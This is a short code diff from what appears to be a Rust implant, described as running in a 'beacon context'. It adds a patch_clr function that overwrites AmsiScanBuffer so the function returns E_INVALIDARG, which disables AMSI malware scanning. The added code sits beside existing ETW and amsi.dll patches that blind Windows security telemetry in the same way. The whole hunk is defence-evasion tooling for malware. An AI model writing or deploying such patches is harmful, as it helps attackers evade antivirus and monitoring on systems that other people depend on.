@@ -161,6 +161,15 @@ pub unsafe fn patch_at(addr: usize) -> Result<(), &'static str> {
     write_patch(addr, &ETW_PATCH)
 }
 
+/// Patch `clr.dll!AmsiScanBuffer` → `mov eax,E_INVALIDARG; ret`.
+///
+/// # Safety
+/// `addr` must be the entry of a patchable function (code page), in a
+/// currently-mapped module. Single-threaded beacon context.
+pub unsafe fn patch_clr(addr: usize) -> Result<(), &'static str> {
+    write_patch(addr, &AMSI_PATCH)
+}
+
 /// Patch `amsi.dll!AmsiScanBuffer` → `mov eax,E_INVALIDARG; ret`.
 ///
 /// Returns `Err("amsi not loaded")` when `amsi.dll` is not yet in the PEB
